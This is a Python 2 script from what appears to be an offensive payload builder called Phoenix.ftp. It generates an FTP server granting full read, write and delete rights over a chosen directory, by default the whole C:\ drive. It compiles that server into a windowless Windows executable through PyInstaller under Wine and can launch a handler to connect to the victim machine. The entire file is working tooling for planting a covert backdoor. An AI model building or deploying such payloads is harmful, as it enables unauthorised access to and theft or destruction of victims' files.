import os, sys, time
from core import colors
import handler


def source(username, password, directory, host, port):
    source = '''
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
authorizer = DummyAuthorizer()
authorizer.add_user("%s", "%s", "%s", perm="elradfmw")
handler = FTPHandler
handler.authorizer = authorizer
server = FTPServer(("%s", %s), handler)
server.serve_forever()
    '''%(username, password, directory, host, port)
    return source

def write(source, filename):
    try:
        ffilename = filename + ".py"
        f = open("output/" + ffilename, "wb+")
        f.write(source)
        print colors.status.OK + " Payload file writen as " + colors.color.GREEN + ffilename + colors.color.ENDC + " successfully."
        f.close()
    except Exception as e:
        print colors.status.ERROR + " Error while writing file, reason : " + str(e)
        sys.exit()

def compile(filename):
    print colors.status.OK + " Compiling payload to executable..."
    print "\n--------------[Pyinstaller output]--------"
    os.system("wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile output/%s.py  --noconsole --hidden-import pyftpdlib"%filename)
    os.system("mv dist/%s.exe output/"%filename)
    time.sleep(1)
    os.system("rm -R dist/ && rm -R build/ && rm %s.spec "%filename)
    print "------------------------------------------"
    print ""
def banner():
    print colors.color.GREEN + """
    ______ _                      _         __ _
    | ___ \ |                    (_)       / _| |
    | |_/ / |__   ___   ___ _ __  ___  __ | |_| |_ _ __
    |  __/| '_ \ / _ \ / _ \ '_ \| \ \/ / |  _| __| '_  |
    | |   | | | | (_) |  __/ | | | |>  < _| | | |_| |_) |
    \_|   |_| |_|\___/ \___|_| |_|_/_/\_(_)_|  \__| .__/
                                                  | |
                                                  |_|

        ** By KRYPT0N ** Off Volume 1.0 ** PROJECT0 **  

    """ + colors.color.ENDC

def opts():
    print colors.color.YELLOW + "\nConnection settings : " + colors.color.ENDC
    print "--------------------- "
    lhost = raw_input("lhost [0.0.0.0]: ")
    if len(lhost) == 0:
        lhost = "0.0.0.0"
    else:
        pass
    lport = raw_input("lport [21]: ")
    if len(lport) == 0:
        lport = "21"
    else:
        pass
    print colors.color.YELLOW + "\nUsers settings : " + colors.color.ENDC
    print "--------------- "
    username = raw_input("Username : ")
    password = raw_input("Password : ")
    directory = raw_input("Directory [C:\\]: ")
    if len(directory) == 0:
        directory = "C:\\\\"
    else:
        pass
    print  colors.color.YELLOW + "\nFinal settings : " + colors.color.ENDC
    print "---------------- "
    filename = raw_input("Save as : ")
    qcompile = raw_input("Compile to windows executable [Y/n]: ")
    qhandler = raw_input("Start handler after generating [Y/n]: ")
    print ""
    build(lhost, lport, username, password, directory, filename, qcompile, qhandler)

def build(lhost, lport, username, password, directory, filename, qcompile, qhandler):
    print colors.status.OK + " Editing payload source code.."
    sourcecode = source(username, password, directory, lhost, lport)
    print colors.status.OK + " Writing payload file.."
    write(sourcecode, filename)
    if qcompile in ('y', 'Y'):
        compile(filename)
    else:
        pass
    if qhandler in ("y", "Y"):
        print colors.color.YELLOW + "\nHandler : " + colors.color.ENDC
        print "---------"
        rhost = raw_input("rhost : ")
        print ""
        handler.main(rhost, int(lport), username, password)
    print colors.status.SUCCESS + " Operation finished check the output folder."

banner()
opts()
